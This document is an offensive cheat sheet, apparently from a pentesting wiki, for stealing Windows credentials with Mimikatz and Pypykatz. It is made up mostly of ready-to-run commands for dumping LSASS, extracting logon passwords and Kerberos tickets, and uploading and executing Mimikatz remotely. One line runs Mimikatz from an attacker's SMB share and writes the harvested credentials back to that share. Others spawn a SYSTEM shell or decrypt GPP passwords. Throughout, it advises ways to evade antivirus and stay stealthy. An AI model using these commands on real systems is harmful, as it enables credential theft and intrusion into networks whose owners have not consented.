# Mimikatz and Pypykatz

## LSASS AND MIMIKATZ

#### LSASS

Avoiding running Mimikatz on the target can be a nice solution for stealth You can just dump the LSASS process, get them and parse it locally

```text
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Several dumping methods here [https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/](https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/)

### Mimikatz

If you have an LSASS dump, you can use the minidump module

```text
mimikatz # sekurlsa::minidump lsass.DMP
mimikatz # sekurlsa::logonPasswords /full
```

You can upload mimikatz to a remote machine with smbclient Or you can use crackmapexec Executon may fail but the binary will be uploaded in C:\Windows\mimikatz.exe

```text
crackmapexec IP -u user -p password -M mimikatz
```

Then you can execute remotely through winexe

```text
winexe -U admin%password //IP C:\\Windows\\mimikatz.exe
```

### Password dumping

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords /full
```

In case of Mimikatz is triggered on the target machine, you can try bring it up using network share

```text
sudo python smbserver.py SHARE /home/xxxxx/share_path/
sudo ./venv/bin/crackmapexec smb IP -u "xxx" -p "xxx" -X '\shareip\SHARE\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords /full" exit > \share_ip\SHARE\mimiout$env:computername.txt'
In order to be stealthier, you can even do the same for procdump
sudo ./venv/bin/crackmapexec smb IP -u "xxx" -p "xxx" -X '\share_ip\SHARE\procdump.exe "TODO"'`
```

## Pypykatz

{% embed url="https://github.com/skelsec/pypykatz" %}

Mimikatz implementation in pure Python. At least a part of it :\)In case of mimikatz is trigerred by the target AVCross platform \(only need python3.6\)Live commands need to be ran on live systemsOthers commands can be used for other purposes

### Get LSASS credentials \(+ Kerberos tickets\)

```text
pypykatz live lsa pypykatz live lsa -o  -k 
```

### List users prone to SPNRoast and ASRepRoast

```text
pypykatz live ldap spn pypykatz live ldap asrep
```

### Print all tokens

```text
pypykatz live token list
```

### Spawn a SYSTEM shell

```text
pypykatz live process create
```

### Print registry credentials

```text
pypykatz live registry
```

### List all users ever logged on the target

```text
pypykatz live users list
```

### Gives back the current user in domain:username:SID format

```text
pypykatz live users whoami
```

### Parse mimidump file

```text
pypykatz lsa minidump 
```

### List domain users prone to SPNRoast or ASRepRoast

```text
pypykatz ldap TEST/victim/pw:@10.10.10.2 spn pypykatz ldap TEST/victim/pw:@10.10.10.2 asrep
```

### Decrypt gpp-pass

```text
pypykatz gppass 
```

